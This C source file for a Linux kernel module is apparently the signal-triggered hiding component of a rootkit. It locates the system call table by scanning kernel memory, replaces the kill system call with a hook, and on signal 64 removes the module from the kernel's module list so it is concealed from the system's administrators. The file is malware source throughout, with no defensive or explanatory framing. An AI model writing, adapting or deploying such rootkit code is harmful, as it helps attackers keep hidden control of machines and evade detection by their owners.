#include "../include/hook_kill.h"
#include <linux/list.h>
#include <linux/types.h>
#include <linux/kallsyms.h>
#include <asm/unistd.h>
#include <linux/syscalls.h>

static uint64_t ** syscall_table_kill;
typedef long (*sys_kill_t)(pid_t, int);
sys_kill_t orig_kill;
static short hide = 0;
struct list_head *prev_module;

void start_hide(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void stop_hide(void){
    list_add(&THIS_MODULE->list, prev_module);
}

asmlinkage long hook_kill(pid_t pid, int sig){
    if (sig == 64 && !hide){
        start_hide();
        hide = 1;
    } else if (sig == 64 && hide)
    {
        stop_hide();
        hide = 0;
    }
    return orig_kill(pid, sig);
}

static unsigned long **fetch_table_addr(void) {
	unsigned long offset;
	unsigned long **track;

	for(offset = PAGE_OFFSET; offset < ULLONG_MAX;
	    offset += sizeof(void *)) {
		track = (unsigned long **) offset;

		if(track[__NR_kill] == (unsigned long *) sys_kill)
			return track;
    	}
	
	return NULL;
}

void init_kill_hook(void){
    uint64_t ** syscall_table = (uint64_t **) fetch_table_addr();
    syscall_table_kill = (uint64_t **) (&syscall_table[__NR_kill]);
    orig_kill = (sys_kill_t)*syscall_table_kill; 
    *syscall_table_kill = (uint64_t*)hook_kill;
}



void remove_kill_hook(void){
    *syscall_table_kill = (uint64_t*)orig_kill;
}
